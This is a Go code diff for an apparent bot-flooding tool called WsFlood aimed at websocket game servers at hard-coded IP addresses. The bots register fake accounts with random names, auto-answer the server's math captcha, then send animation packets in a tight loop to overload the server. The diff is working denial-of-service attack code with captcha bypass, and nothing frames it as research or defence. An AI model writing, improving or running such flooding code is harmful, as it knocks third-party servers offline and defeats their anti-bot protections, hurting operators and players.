@@ -9,15 +9,16 @@ import (
 	"github.com/gorilla/websocket"
 )
 
-// var addr string = "123.56.152.69:12345"
+// var addr string = "106.126.15.8:13579"
 
-var addr string = "43.248.189.71:2107"
+var addr string = "101.32.221.233:40738"
 var authme bool = false
+var dial *websocket.Dialer
 
 func WsFlood(motd bool) {
-	c, _, err := websocket.DefaultDialer.Dial("ws://"+addr+"/", nil)
+	c, _, err := dial.Dial("ws://"+addr+"/", nil)
 	if err != nil {
-		log.Println("dial:", err)
+		// log.Println("dial:", err)
 		return
 	}
 	closed := false
@@ -30,11 +31,11 @@ func WsFlood(motd bool) {
 	if motd {
 		err = c.WriteMessage(websocket.TextMessage, []byte("Accept: MOTD"))
 	} else {
-		err = c.WriteMessage(websocket.BinaryMessage, buildLoginPacket(RandStringRunes(5)+"T4nk", addr))
+		err = c.WriteMessage(websocket.BinaryMessage, buildLoginPacket("Dimples_"+RandStringRunes(5), addr))
 		err = c.WriteMessage(websocket.BinaryMessage, buildCustomPayload("EAG|MySkin", []byte{0x04, byte(rand.Intn(64))}))
 	}
 	if err != nil {
-		log.Println(err)
+		// log.Println(err)
 		return
 	}
 	handleChat := func(msg string) {
@@ -42,49 +43,63 @@ func WsFlood(motd bool) {
 			return
 		}
 		log.Println(msg)
-		if strings.Contains(msg, "等于") && strings.Contains(msg, "?") {
-			log.Println(msg)
-			res := solve(msg)
+		if strings.Contains(msg, "/register") {
 			go func() {
-				time.Sleep(1 * time.Second)
-				if closed {
-					return
-				}
-				err := c.WriteMessage(websocket.BinaryMessage, buildChat(res))
-				if err != nil {
-					return
-				}
 				time.Sleep(3 * time.Second)
 				if closed {
 					return
 				}
-				err = c.WriteMessage(websocket.BinaryMessage, buildChat("/register 114514 114514"))
+				err := c.WriteMessage(websocket.BinaryMessage, buildChat("/register 114514 114514"))
 				if err != nil {
-					log.Println("read:", err)
 					return
 				}
 				err = c.WriteMessage(websocket.BinaryMessage, buildChat("/login 114514"))
 				if err != nil {
-					log.Println("read:", err)
 					return
 				}
-				time.Sleep(5 * time.Second)
-				if closed {
-					return
+				// err = c.WriteMessage(websocket.BinaryMessage, buildChat("CAPTCHA SOLVER => "+res))
+				// if err != nil {
+				// 	log.Println("read:", err)
+				// 	return
+				// }
+				for true {
+					time.Sleep(1 * time.Millisecond)
+					if closed {
+						return
+					}
+					for L := 0; L < 10 && !closed; L++ {
+						err = c.WriteMessage(websocket.BinaryMessage, buildAnimation(0))
+						if err != nil {
+							return
+						}
+					}
 				}
-				err = c.WriteMessage(websocket.BinaryMessage, buildChat("CAPTCHA SOLVER => "+res))
-				if err != nil {
-					log.Println("read:", err)
-					return
-				}
+				// for true {
+				// 	time.Sleep(1 * time.Second)
+				// 	if closed {
+				// 		return
+				// 	}
+				// 	err = c.WriteMessage(websocket.BinaryMessage, buildChat(GetWord()))
+				// 	if err != nil {
+				// 		log.Println("read:", err)
+				// 		return
+				// 	}
+				// }
 			}()
+		} else if strings.Contains(msg, "=?") {
+			log.Println(msg)
+			res := solve(msg)
+			err := c.WriteMessage(websocket.BinaryMessage, buildChat(res))
+			if err != nil {
+				// log.Println("read:", err)
+				return
+			}
 		}
 	}
 	for true {
 		_, msg, err := c.ReadMessage()
 		// _, _, err := c.ReadMessage()
 		if err != nil {
-			log.Println("read:", err)
 			return
 		}
 		// log.Printf("receive: id=%d len=%d\n", msg[0], len(msg))
@@ -121,6 +136,9 @@ func readShort(b []byte, p int) int {
 }
 
 func handleDisconnect(msg string) {
+	if len(msg) > 100 {
+		return
+	}
 	if strings.Contains(msg, "full") {
 		return
 	}
@@ -141,6 +159,10 @@ func buildCustomPayload(channel string, msg []byte) []byte {
 	b = writeShort(b, len(msg))
 	b = append(b, msg...)
 	return b
+}
+
+func buildAnimation(entityId int) []byte {
+	return []byte{18, 0x00, 0x00, byte(entityId >> 8 & 255), byte(entityId >> 0 & 255), 0x01}
 }
 
 func buildClientInfo(lang string) []byte {
